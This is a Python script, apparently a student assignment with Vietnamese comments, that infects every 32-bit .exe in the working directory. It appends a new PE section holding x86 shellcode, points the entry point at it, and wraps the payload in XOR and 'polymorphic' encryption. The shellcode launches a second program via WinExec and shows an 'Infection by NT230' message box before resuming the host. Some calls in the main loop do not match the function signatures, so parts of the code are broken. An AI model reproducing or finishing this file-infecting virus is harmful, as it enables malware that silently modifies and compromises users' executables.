# Import các module và hàm cần thiết
import pefile
from os import listdir, getcwd
from os.path import isfile, join
import random
import string

# Hàm cân chỉnh kích thước cho đúng giới hạn cụ thể
def align_size(size, align):
    return (size + align - 1) & ~(align - 1)

# Hàm tìm địa chỉ của MessageBoxW trong file PE
def find_msg_box(pe):
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        dll_name = entry.dll.decode('utf-8')  # Giải mã tên DLL
        if dll_name == "USER32.dll":
            for func in entry.imports:
                if func.name.decode('utf-8') == "MessageBoxW":  # Giải mã tên hàm
                    return func.address

# Hàm tạo payload chứa mã độc
def generate_payload(msg_box_off, oep, caption_off, text_off, size):
    shellcode_to_spread = b'\x50\x53\x51\x52\x56\x57\x55\x89\xE5\x83\xEC\x18\x31\xF6\x66\x56\x6A\x63\x66\x68\x78\x65\x68\x57\x69\x6E\x45\x89\x65\xFC\x31\xF6\x64\x8B\x5E\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x26\xEB\x2B\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x69\x72\x75\x73\x68\x6E\x6F\x74\x76\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x46\x5D\x5F\x5E\x5A\x59\x5B\x58'
    cap_little = caption_off.to_bytes(4, 'little')  # Chuyển caption_off thành dạng bytes theo little-endian
    text_little = text_off.to_bytes(4, 'little')  # Chuyển text_off thành dạng bytes theo little-endian
    msg_box_little = msg_box_off.to_bytes(4, 'little')  # Chuyển msg_box_off thành dạng bytes theo little-endian
    oep_little = oep.to_bytes(4, byteorder='little', signed=True)  # Chuyển oep thành dạng bytes theo little-endian với kiểu signed integer
    payload = shellcode_to_spread + b'\x6a\x00\x68' + cap_little + b'\x68' + text_little + \
        b'\x6a\x00\xff\x15' + msg_box_little + b'\xe9' + \
        oep_little + b'\x00\x00\x00\x00\x00\x00\x00'
    payload += b'\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00\x32\x00\x33\x00\x30\x00\x00\x00\x32\x00\x31\x00\x35\x00\x32\x00\x31\x00\x32\x00\x34\x00\x38\x00\x5F\x00\x32\x00\x31\x00\x35\x00\x32\x00\x32\x00\x30\x00\x35\x00\x36\x00\x5F\x00\x32\x00\x31\x00\x35\x00\x32\x00\x32\x00\x36\x00\x34\x00\x31'
    return payload

# Hàm tạo một phần mới cho PE file
def create_new_section(pe):
    last_section = pe.sections[-1]  # Lấy phần cuối cùng của PE file
    new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)  # Tạo một cấu trúc mới cho phần section
    new_section.__unpack__(bytearray(new_section.sizeof()))  # Khởi tạo dữ liệu cho phần mới tạo
    new_section.set_file_offset(
        last_section.get_file_offset() + last_section.sizeof())  # Đặt vị trí của phần section mới
    new_section.Name = b'.test'  # Đặt tên cho phần mới
    new_section_size = 200  # Đặt kích thước cho phần mới
    new_section.SizeOfRawData = align_size(
        new_section_size, pe.OPTIONAL_HEADER.FileAlignment)  # Cân chỉnh kích thước
    new_section.PointerToRawData = len(pe.__data__)  # Đặt con trỏ tới dữ liệu raw
    new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = new_section_size
    new_section.VirtualAddress = last_section.VirtualAddress + \
        align_size(last_section.Misc_VirtualSize,
                   pe.OPTIONAL_HEADER.SectionAlignment)  # Đặt địa chỉ ảo
    new_section.Characteristics = 0xE0000040  # Đặt các đặc điểm của phần mới
    return new_section

# Hàm chèn mã độc vào PE file
def append_payload(file_path):
    pe = pefile.PE(file_path)  # Mở PE file
    new_section = create_new_section(pe)  # Tạo một phần mới
    msg_box_off = find_msg_box(pe)  # Tìm địa chỉ của MessageBoxW
    caption_off = 0xCD + new_section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase  # Tính địa chỉ cho caption
    text_off = 0xF3 + new_section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase  # Tính địa chỉ cho text
    old_entry_point_va = pe.OPTIONAL_HEADER.AddressOfEntryPoint + \
        pe.OPTIONAL_HEADER.ImageBase  # Lấy địa chỉ của entry point cũ
    new_entry_point_va = new_section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase  # Đặt địa chỉ của entry point mới
    jmp_instruction_va = new_entry_point_va + 0x14 + 0xad  # Tính địa chỉ cho lệnh JMP
    rva_oep = old_entry_point_va - 5 - jmp_instruction_va  # Tính địa chỉ relative của entry point cũ
    payload = generate_payload(
        msg_box_off, rva_oep, caption_off, text_off, new_section.SizeOfRawData)  # Tạo payload
    data_of_new_section = bytearray(new_section.SizeOfRawData)  # Tạo một bytearray với kích thước của phần mới
    for i, byte_value in enumerate(payload):
        data_of_new_section[i] = byte_value  # Đặt các giá trị của payload vào phần mới
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress  # Đặt entry point mới
    pe.OPTIONAL_HEADER.SizeOfImage += align_size(200, pe.OPTIONAL_HEADER.SectionAlignment)  # Cập nhật kích thước của hình ảnh
    pe.FILE_HEADER.NumberOfSections += 1  # Tăng số lượng phần lên 1
    pe.sections.append(new_section)  # Thêm phần mới vào danh sách phần
    pe.__structures__.append(new_section)  # Thêm phần mới vào cấu trúc

    # Encrypt payload using XOR
    key = b'X'
    for i in range(len(payload)):
        data_of_new_section[i] = payload[i] ^ key[i % len(key)]
    pe.__data__ = bytearray(pe.__data__) + data_of_new_section  # Cập nhật dữ liệu cho PE file
    pe.write(file_path)  # Ghi PE file
    pe.close()  # Đóng PE file

# Hàm tạo biến thể mã độc sử dụng phương pháp Polymorphic
def generate_polymorphic_payload(msg_box_off, oep, caption_off, text_off, size, key):
    payload = generate_payload(msg_box_off, oep, caption_off, text_off, size)
    encrypted_payload = bytearray()

    for i in range(0, len(payload), len(key)):
        for j in range(len(key)):
            if i + j < len(payload):
                encrypted_payload.append(payload[i + j] ^ key[j])
            else:
                break

    return encrypted_payload

if __name__ == '__main__':
    current_dir = getcwd()
    files_name = [f for f in listdir(current_dir) if (
        isfile(join(current_dir, f)) & f.endswith(".exe"))]  # Lấy tên các file exe trong thư mục hiện tại
    for file in files_name:
        print(file)  # In tên các file exe
    for file in files_name:
        pe = pefile.PE(file)  # Mở từng file exe
        last_section = pe.sections[-1] # Lấy phần cuối cùng
        last_section_name = last_section.Name.decode('UTF-8').rstrip('\x00')  # Lấy tên của phần cuối cùng
        pe.close()  # Đóng file exe
        if pe.FILE_HEADER.Machine == 0x8664 or last_section_name == ".test":  # Kiểm tra nếu là 64-bit hoặc đã được xử lý rồi
            continue
        else:
            # Tìm địa chỉ của MessageBoxW
            msg_box_off = find_msg_box(pe)
            # Tìm địa chỉ của Entry Point
            oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
            # Tạo một key ngẫu nhiên để mã hóa mã độc
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16)).encode()
            # Tạo biến thể mã độc sử dụng phương pháp Polymorphic
            new_payload = generate_polymorphic_payload(msg_box_off, oep, msg_box_off, oep, last_section.SizeOfRawData, key)
            append_payload(file, new_payload)  # Thêm mã độc vào file